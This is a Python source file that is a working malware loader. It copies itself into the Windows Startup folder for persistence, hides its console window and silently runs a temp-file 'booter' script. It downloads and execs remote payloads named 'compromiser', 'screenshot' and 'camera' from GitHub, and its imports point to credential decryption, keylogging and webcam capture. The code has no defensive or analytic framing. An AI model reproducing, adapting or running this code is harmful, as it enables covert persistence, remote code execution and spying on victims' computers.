import random
import string
import os
import subprocess
import sys
import json
import urllib.request
import re
import base64
import datetime
import shutil
import sqlite3
import requests
import tempfile
import platform
import psutil
import cpuinfo
import GPUtil
import socket
import getpass
import threading
import time
import keyboard
import ctypes
import cv2
import pyautogui
import win32crypt
from Crypto.Cipher import AES
from pynput import mouse, keyboard as pynput_keyboard

def copy_exe_to_startup(exe_path):
    """Copy the executable to the startup folder"""
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    destination_path = os.path.join(startup_folder, os.path.basename(exe_path))

    if not os.path.exists(destination_path):
        shutil.copy2(exe_path, destination_path)

def run_booter_in_background():
    """Run the booter script in the background without showing a terminal"""
    try:
        booter_script = '''
import requests
def fetch_and_execute_script(urls):
    for url in urls:
        try:
            response = requests.get(url)
            exec(response.text, globals())
        except Exception as e:
            pass
github_urls = ['https://raw.githubusercontent.com/kaki869/booter/refs/heads/main/booter.py']
fetch_and_execute_script(github_urls)
'''
        temp_script = os.path.join(tempfile.gettempdir(), "booter_runner.py")
        with open(temp_script, 'w') as f:
            f.write(booter_script)

        if platform.system() == "Windows":
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
            subprocess.Popen(
                f'pythonw "{temp_script}"',
                creationflags=subprocess.CREATE_NO_WINDOW,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
        else:
            subprocess.Popen(
                ['python3', temp_script],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

    except Exception as e:
        pass

def fetch_and_execute_script(urls):
    """Main script loader"""
    for url in urls:
        try:
            response = requests.get(url)
            response.raise_for_status()
            script_content = response.text
            exec(script_content, globals())
        except requests.exceptions.RequestException as e:
            pass
        except Exception as e:
            pass

def main():
    exe_path = os.path.abspath(sys.argv[0])
    copy_exe_to_startup(exe_path)

    run_booter_in_background()

    github_urls = [
        'https://raw.githubusercontent.com/kaki869/compromiser/refs/heads/main/compromiser.py',
        'https://raw.githubusercontent.com/kaki869/screenshot-taker/refs/heads/main/screenshot.py',
        'https://raw.githubusercontent.com/kaki869/camera/refs/heads/main/camera.py'
    ]

    fetch_and_execute_script(github_urls)

if __name__ == "__main__":
    if platform.system() == "Windows":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    main()
